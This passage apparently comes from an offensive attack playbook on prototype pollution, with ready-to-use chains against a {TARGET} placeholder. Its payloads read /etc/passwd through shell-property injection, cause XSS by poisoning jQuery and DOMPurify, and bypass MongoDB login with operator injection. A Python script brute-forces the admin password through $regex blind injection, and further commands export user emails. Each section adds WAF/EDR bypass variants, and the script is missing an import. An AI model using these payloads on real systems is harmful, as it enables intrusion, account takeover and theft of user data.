**4. 4. Generic DoS/Information Disclosure Gadget**
_Use generic gadgets to cause DoS, status-code tampering, environment-variable injection, and arbitrary file read_
```
# pollute toString to cause an exception
{"__proto__": {"toString": null}}

# pollute the status property to change the response
{"__proto__": {"status": 500}}

# pollute for environment-variable injection
{"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/environ"}}}

# pollute the shell property (with child_process.exec)
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require(\"fs\").readFileSync(\"/etc/passwd\",\"utf8\"))//"}}}
```

**WAF/EDR Bypass Variants:**

**1. Bypass __proto__ Keyword Filtering**
_Bypass __proto__ filtering via Unicode encoding, constructor path, nested objects, and JSON5 syntax_
```
# Unicode encoding
{"\u005f\u005fproto\u005f\u005f": {"polluted": true}}

# constructor path
{"constructor": {"prototype": {"polluted": true}}}

# nested path
{"a": {"__proto__": {"polluted": true}}}

# use JSON5 syntax (if supported)
{__proto__: {polluted: true}}

# array prototype pollution
{"__proto__": [], "length": 1, "0": "exploit"}
```

---

### Client-Side Prototype Pollution to XSS  `proto-client-xss`
Pollutes the front-end JavaScript prototype chain via URL parameters, postMessage, or DOM operations, using jQuery/DOM manipulation library gadgets to achieve client-side XSS. The attacker can lure victims into triggering the vulnerability via a crafted URL link.
Subcategory: **Client-Side Exploitation** · tags: `prototype-chain` `XSS` `client-side` `jQuery` `DOM` `Prototype Pollution`

**Prerequisites:** the target front-end uses a vulnerable JS library; logic converting URL parameters to objects present

**Attack Chain:**

**1. 1. Identify Client-Side Pollution Sources**
_Test front-end prototype pollution via URL parameters and hash fragments_
```
# URL parameter parsing pollution (common in custom query parsers)
https://{TARGET}/page?__proto__[polluted]=test
https://{TARGET}/page?__proto__.polluted=test
https://{TARGET}/page?constructor[prototype][polluted]=test

# hash-fragment pollution
https://{TARGET}/page#__proto__[polluted]=test

# verification: check in the console
console.log(({}).polluted); // if it outputs "test", pollution is confirmed
```

**2. 2. jQuery html() Gadget**
_Achieve XSS and property injection using jQuery's html() method and $.extend() deep copy_
```
# pollute jQuery's innerHTML gadget
# Step 1: pollute the prototype
https://{TARGET}/page?__proto__[innerHTML]=<img/src=x onerror=alert(document.domain)>

# Step 2: wait for jQuery to call $(element).html() or $.html()
# when jQuery creates a new element it reads the innerHTML property

# jQuery $.extend() deep-copy pollution
$.extend(true, {}, JSON.parse('{"__proto__":{"isAdmin":true}}'));
// afterwards all obj.isAdmin return true
```

**3. 3. DOMPurify Bypass Gadget**
_Achieve XSS by polluting DOMPurify config, Lodash template, and transport URL_
```
# pollute DOMPurify config to achieve XSS
# bypass ALLOWED_TAGS
https://{TARGET}/page?__proto__[ALLOWED_ATTR][]=onerror&__proto__[ALLOWED_ATTR][]=src

# pollute the sanitize behavior
https://{TARGET}/page?__proto__[ALLOW_ARIA_ATTR]=1&__proto__[IS_ALLOWED_URI][]=javascript

# Lodash template gadget
# if _.template is used and its options are polluted
https://{TARGET}/page?__proto__[sourceURL]=%22%0aalert(1)//

# construct the complete PoC link
https://{TARGET}/page?__proto__[transport_url]=javascript:alert(1)
```

**4. 4. Automated Detection Script**
_Use Puppeteer to automatically detect prototype pollution vulnerabilities in front-end pages_
```
# PPScan — automated client-side prototype pollution detection
# automated testing using Puppeteer
const puppeteer = require('puppeteer');
const browser = await puppeteer.launch();
const page = await browser.newPage();

// inject the detection script
await page.evaluateOnNewDocument(() => {
  const marker = Math.random().toString(36);
  Object.defineProperty(Object.prototype, '__pp_test__', {
    set: function(v) { window.__ppDetected = true; }
  });
});

await page.goto('https://{TARGET}/page?__proto__[__pp_test__]=1');
const detected = await page.evaluate(() => window.__ppDetected);
console.log('Prototype Pollution:', detected ? 'VULNERABLE' : 'NOT DETECTED');
```

**WAF/EDR Bypass Variants:**

**1. Bypass URL Parameter Filtering**
_Bypass front-end prototype pollution filtering via URL encoding, constructor path, and nested structures_
```
# URL-encode __proto__
?__%70roto__[xss]=test
?%5f%5fproto%5f%5f[xss]=test

# using the constructor path
?constructor[prototype][xss]=test
?constructor.prototype.xss=test

# array-index pollution
?__proto__[0]=payload

# multi-level nesting
?a[__proto__][xss]=test
?a.b.__proto__.xss=test
```

---

### Prototype Pollution Combined with NoSQL Injection  `proto-nosql-injection`
Combines prototype pollution with MongoDB/NoSQL injection. By polluting prototype-chain properties of the query object, bypasses authentication logic or constructs malicious query conditions, achieving authentication bypass and data leakage.
Subcategory: **Combined Exploitation** · tags: `prototype-chain` `NoSQL` `MongoDB` `auth-bypass` `combined-attack`

**Prerequisites:** the target uses MongoDB; a prototype pollution point present; query-construction logic present

**Attack Chain:**

**1. 1. Identify MongoDB Query Injection Points**
_Test NoSQL injection with MongoDB operators ($ne/$regex/$gt) for authentication bypass_
```
# test NoSQL operator injection
curl -X POST "https://{TARGET}/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'

# $regex match
curl -X POST "https://{TARGET}/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$regex": ".*"}}'

# $gt always-true condition
curl -X POST "https://{TARGET}/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$gt": ""}}'
```

**2. 2. Prototype Pollution to Bypass Query Validation**
_Use prototype pollution to inject MongoDB's $where condition and bypass operator filtering_
```
# scenario: the backend filters operators
# if (hasOperator(input)) reject();

# inject $where via prototype pollution
curl -X PATCH "https://{TARGET}/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"$where": "function(){return true}"}}'

# subsequent queries will inherit the $where condition
curl -X POST "https://{TARGET}/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "anything"}'
# if the login query uses the polluted object, the always-true $where condition causes authentication bypass
```

**3. 3. Boolean Blind Injection Data Extraction**
_Use $regex blind injection to extract the password stored in MongoDB character by character_
```
# use $regex to extract the admin password character by character
import requests
import string

url = "https://{TARGET}/api/login"
password = ""
chars = string.ascii_letters + string.digits + string.punctuation

for i in range(32):
    for c in chars:
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password}{re.escape(c)}"}
        }
        r = requests.post(url, json=payload)
        if r.status_code == 200 and "token" in r.text:
            password += c
            print(f"Found: {password}")
            break

print(f"Admin password: {password}")
```

**4. 4. Database Enumeration and Export**
_Use administrator privileges gained via authentication bypass to enumerate and export sensitive data_
```
# use $func to execute server-side JS (legacy MongoDB)
curl -X POST "https://{TARGET}/api/search" \
  -H "Content-Type: application/json" \
  -d '{"$where": "function(){return this.role==\"admin\"}"}'

# use the obtained authentication bypass to export data
curl -s "https://{TARGET}/api/users?limit=1000" \
  -H "Authorization: Bearer {ADMIN_TOKEN}" | jq '.[].email'

# check the MongoDB REST interface (if exposed)
curl -s "https://{TARGET}:28017/" 2>/dev/null
curl -s "https://{TARGET}/api/db/_stats" 2>/dev/null
```

**WAF/EDR Bypass Variants:**

**1. Bypass NoSQL Operator Filtering**
_Bypass NoSQL injection filtering via Unicode encoding, Content-Type switching, and form format_
```
# Unicode-encode the operator
{"username": "admin", "password": {"\u0024ne": ""}}

# nested bypass
{"username": "admin", "password": {"$eq": {"$ne": ""}}}

# leverage Content-Type differences
# application/x-www-form-urlencoded
username=admin&password[$ne]=&password[$regex]=.*

# array injection
username=admin&password[0][$gt]=
```

---
